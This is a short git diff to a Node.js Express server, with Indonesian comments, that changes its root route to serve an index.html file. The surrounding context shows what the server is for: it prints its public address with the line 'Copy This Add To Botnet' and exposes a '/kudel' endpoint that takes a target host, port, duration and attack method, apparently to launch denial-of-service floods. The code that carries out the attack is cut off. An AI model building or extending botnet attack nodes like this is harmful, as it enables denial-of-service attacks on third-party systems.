@@ -2,6 +2,7 @@ const express = require('express');
 const { exec } = require('child_process');
 const url = require('url');
 const cors = require('cors');
+const path = require('path'); // Import modul 'path'
 const app = express();
 const port = process.env.PORT || process.env.SERVER_PORT || 3000;
 
@@ -9,15 +10,21 @@ app.use(cors());
 app.use(express.json()); // Untuk memproses body JSON
 app.use(express.urlencoded({ extended: true }));
 
+// Lokasi file index.html
+const indexPath = path.join(__dirname, 'index.html'); // Gabungkan direktori saat ini dengan 'index.html'
+
 async function fetchData() {
     const response = await fetch('https://httpbin.org/get');
     const data = await response.json();
     console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
     return data
 }
+
+// Endpoint "/" untuk mengirimkan file index.html
 app.get('/', (req, res) => {
-    res.send('index.html'); //Endpoint "/"
+    res.sendFile(indexPath); // Kirim file index.html
 });
+
 app.get('/kudel', (req, res) => {
     const { host, port: targetPort, time, methods } = req.query;
 
